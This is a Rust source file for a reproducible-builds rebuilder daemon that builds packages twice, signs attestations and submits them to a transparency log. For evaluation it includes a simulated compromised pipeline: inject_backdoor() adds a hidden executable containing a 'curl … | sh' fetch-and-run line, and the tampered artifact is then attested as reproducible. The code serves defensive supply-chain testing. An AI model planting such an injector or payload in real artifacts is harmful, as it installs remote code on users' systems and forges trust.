//! Thread — the rebuilder daemon (SRS §5.4).
//!
//! For each package version a rebuilder:
//! 1. fetches the recipe and all pinned inputs (no code executed);
//! 2. builds **twice** under Heddle with deliberately different environments
//!    (time zone, locale, umask, build path) — the reprotest approach from
//!    the Reproducible Builds project;
//! 3. if both builds agree, attests `reproducible` with that digest; if not,
//!    attests `unreproducible` and makes no digest claim (audit item A6:
//!    only self-verified rebuilders can contradict others, which bounds the
//!    denial-of-service power of a single faulty rebuilder under FR-6.4);
//! 4. signs an in-toto statement with its own Ed25519 key (FR-4.3) and
//!    submits it to Warp (FR-4.4);
//! 5. stores the artifact in its Shuttle CAS and serves it to peers.

pub mod build;

use build::{BuildOptions, Variation};
use loom_core::attest::{self, LogRecord, Observed, Outcome, RebuildPredicate, RebuilderRef, SourceRef, Toolchain};
use loom_core::digest::Digest;
use loom_core::ecosystem::{Backend, PackageMeta};
use loom_core::http::Client;
use loom_core::keys::SecretKey;
use loom_shuttle::Cas;
use loom_warp::server::{AddResponse, EntriesResponse};
use std::collections::BTreeMap;
use std::path::PathBuf;
use std::time::Duration;

pub struct Rebuilder {
    pub id: String,
    pub org: String,
    pub key: SecretKey,
    pub image: String,
    pub log_url: String,
    pub cache: PathBuf,
    pub cas: Cas,
    pub opts: BuildOptions,
    /// Demo/evaluation only: model a compromised release pipeline (ADV-3/4)
    /// that attests an artifact not corresponding to the source.
    pub tamper: bool,
    /// Evaluation only (E6): submit into the forked history a split-view log
    /// serves to its victim, modelling a hostile log operator colluding
    /// with a compromised rebuilder. Ignored by logs not in split-view mode.
    pub into_fork: bool,
    http: Client,
}

#[derive(Debug, serde::Serialize)]
pub struct RebuildResult {
    pub package: String,
    pub version: String,
    pub outcome: Outcome,
    pub artifact: Option<Digest>,
    pub variants: Vec<Digest>,
    pub log_index: Option<u64>,
    pub note: String,
}

impl Rebuilder {
    #[allow(clippy::too_many_arguments)]
    pub fn new(id: &str, org: &str, key: SecretKey, image: &str, log_url: &str, cache: PathBuf, opts: BuildOptions, tamper: bool) -> Self {
        let cas = Cas::new(&cache.join("cas"));
        Rebuilder {
            id: id.into(),
            org: org.into(),
            key,
            image: image.into(),
            log_url: log_url.trim_end_matches('/').into(),
            cache,
            cas,
            opts,
            tamper,
            into_fork: false,
            http: Client::new(Duration::from_secs(10)),
        }
    }

    pub fn toolchain(&self, tier: &str) -> Toolchain {
        Toolchain::new(&self.image, build::detect_components(), tier)
    }

    /// Fetch log entries (unverified: used only to skip work and to list
    /// disputes; clients verify everything themselves).
    fn log_records(&self) -> Vec<(u64, LogRecord)> {
        let mut out = vec![];
        let mut start = 0u64;
        loop {
            let Ok(body) = self.http.get(&format!("{}/entries?start={start}", self.log_url)) else {
                break;
            };
            let Ok(er) = serde_json::from_slice::<EntriesResponse>(&body) else { break };
            if er.entries.is_empty() {
                break;
            }
            for (i, e) in er.entries.iter().enumerate() {
                if let Ok(r) = serde_json::from_str::<LogRecord>(e) {
                    out.push((er.start + i as u64, r));
                }
            }
            start = er.start + er.entries.len() as u64;
        }
        out
    }

    fn already_attested(&self, recs: &[(u64, LogRecord)], pkg: &str, ver: &str, commit: &str) -> bool {
        recs.iter().any(|(_, r)| {
            r.decode_rebuild_unverified()
                .map(|s| {
                    s.predicate.rebuilder.id == self.id
                        && s.predicate.package == pkg
                        && s.predicate.version == ver
                        && s.predicate.source.commit == commit
                })
                .unwrap_or(false)
        })
    }

    pub fn submit(&self, rec: &LogRecord) -> anyhow::Result<AddResponse> {
        let body = self
            .http
            .post(
                &format!("{}/add{}", self.log_url, if self.into_fork { "?fork=1" } else { "" }),
                "application/json",
                &serde_json::to_vec(rec)?,
            )?;
        Ok(serde_json::from_slice(&body)?)
    }

    /// Rebuild one package at its current head and attest the result.
    pub fn rebuild(&self, backend: &dyn Backend, meta: &PackageMeta, recs: &[(u64, LogRecord)]) -> anyhow::Result<RebuildResult> {
        let checkout = backend.checkout(meta, &self.cache)?;
        if self.already_attested(recs, &meta.name, &checkout.version, &checkout.commit) {
            return Ok(RebuildResult {
                package: meta.name.clone(),
                version: checkout.version.clone(),
                outcome: Outcome::Reproducible,
                artifact: None,
                variants: vec![],
                log_index: None,
                note: "already attested".into(),
            });
        }
        let vars = Variation::standard();
        let mut digests = vec![];
        let mut artifact = None;
        let mut tier = "unknown".to_string();
        let mut source_digest = None;
        let mut failure = None;
        let mut hostile: Vec<String> = vec![];
        for (i, v) in vars.iter().enumerate() {
            // Different build path per variant (reduced/unconfined tiers expose it).
            let wd = self
                .cache
                .join("build")
                .join(format!("{}-{}-{}", meta.name, &checkout.commit[..8], v.name))
                .join(if i == 0 { "x" } else { "variant-path-y" });
            let logp = self.cache.join("logs").join(format!("{}-{}-{}.log", meta.name, checkout.version, v.name));
            let b = build::build(backend, meta, &checkout, &wd, v, &self.opts, &logp)?;
            source_digest = Some(b.plan.source_digest);
            if let Some(r) = &b.report {
                tier = r.tier.as_str().to_string();
                for d in r.denials.iter().filter(|d| d.is_hostile(self.opts.allow_network)) {
                    let s = format!("{} {} [{}]", d.syscall, d.resource, d.requirement);
                    if !hostile.contains(&s) {
                        hostile.push(s);
                    }
                }
            }
            match (b.digest, b.artifact) {
                (Some(d), Some(a)) => {
                    digests.push(d);
                    artifact.get_or_insert(a);
                }
                _ => {
                    failure = Some(b.error.unwrap_or_else(|| "build failed".into()));
                    break;
                }
            }
        }
        // A build that reached for credentials or the network was contained,
        // but its output is not evidence of anything: refuse to vouch for it
        // (fail closed), whatever its exit status.
        if failure.is_none() && !hostile.is_empty() {
            failure = Some(format!("refused: build attempted {}", hostile.join(", ")));
        }
        let (mut outcome, mut claim) = match (&failure, digests.as_slice()) {
            (Some(_), _) => (Outcome::BuildFailed, None),
            (None, [a, b]) if a == b => (Outcome::Reproducible, Some(*a)),
            _ => (Outcome::Unreproducible, None),
        };
        if self.tamper {
            if let Some(a) = artifact.as_mut() {
                // Simulated compromised release pipeline: inject a file.
                *a = inject_backdoor(a)?;
                claim = Some(Digest::of(a));
                outcome = Outcome::Reproducible;
            }
        }
        let disputes: Vec<Digest> = match claim {
            Some(c) => recs
                .iter()
                .filter_map(|(_, r)| r.decode_rebuild_unverified().ok())
                .filter(|s| s.predicate.package == meta.name && s.predicate.source.commit == checkout.commit)
                .filter_map(|s| s.predicate.artifact)
                .filter(|d| *d != c)
                .collect::<std::collections::BTreeSet<_>>()
                .into_iter()
                .collect(),
            None => vec![],
        };
        let pred = RebuildPredicate {
            ecosystem: backend.ecosystem().into(),
            package: meta.name.clone(),
            version: checkout.version.clone(),
            source: SourceRef {
                repo: meta.repo_url.clone(),
                commit: checkout.commit.clone(),
                digest: source_digest.unwrap_or(Digest::of(b"")),
            },
            outcome,
            artifact: claim,
            variant_digests: digests.clone(),
            rebuilder: RebuilderRef { id: self.id.clone(), org: self.org.clone() },
            toolchain: self.toolchain(&tier),
            observed: Observed { maintainer: meta.maintainer.clone(), last_modified: meta.last_modified },
            timestamp: loom_core::time::now(),
            disputes,
        };
        let rec = attest::sign_rebuild(pred, &self.key)?;
        let added = self.submit(&rec)?;
        if let (Some(a), Some(_)) = (&artifact, claim) {
            self.cas.put(a)?;
        }
        Ok(RebuildResult {
            package: meta.name.clone(),
            version: checkout.version,
            outcome,
            artifact: claim,
            variants: digests,
            log_index: Some(added.index),
            note: failure.unwrap_or_default(),
        })
    }

    /// Rebuild every package the repository lists (or `only`).
    pub fn run_once(&self, backend: &dyn Backend, only: &[String]) -> anyhow::Result<Vec<RebuildResult>> {
        let names = if only.is_empty() { backend.list_packages()? } else { only.to_vec() };
        let recs = self.log_records();
        let metas = backend.resolve(&names)?;
        let mut out = vec![];
        for m in metas {
            match self.rebuild(backend, &m, &recs) {
                Ok(r) => out.push(r),
                Err(e) => out.push(RebuildResult {
                    package: m.name.clone(),
                    version: m.version.clone(),
                    outcome: Outcome::BuildFailed,
                    artifact: None,
                    variants: vec![],
                    log_index: None,
                    note: format!("error: {e:#}"),
                }),
            }
        }
        Ok(out)
    }
}

/// Append a file to a gzip'd tar artifact (demo of a tampered release).
fn inject_backdoor(artifact: &[u8]) -> anyhow::Result<Vec<u8>> {
    use std::io::Read;
    let mut ar = tar::Archive::new(flate2::read::GzDecoder::new(artifact));
    let gz = flate2::GzBuilder::new().mtime(0).write(Vec::new(), flate2::Compression::new(6));
    let mut tb = tar::Builder::new(gz);
    for e in ar.entries()? {
        let mut e = e?;
        let h = e.header().clone();
        let mut d = vec![];
        e.read_to_end(&mut d)?;
        tb.append(&h, d.as_slice())?;
    }
    let payload = b"#!/bin/sh\n# injected by compromised release pipeline\ncurl -s http://127.0.0.1:1/x | sh\n";
    let mut h = tar::Header::new_gnu();
    h.set_path("usr/lib/.update-helper")?;
    h.set_mode(0o755);
    h.set_size(payload.len() as u64);
    h.set_mtime(0);
    h.set_cksum();
    tb.append(&h, &payload[..])?;
    Ok(tb.into_inner()?.finish()?)
}

pub fn components_summary(c: &BTreeMap<String, String>) -> String {
    c.iter().map(|(k, v)| format!("{k}: {v}")).collect::<Vec<_>>().join("; ")
}
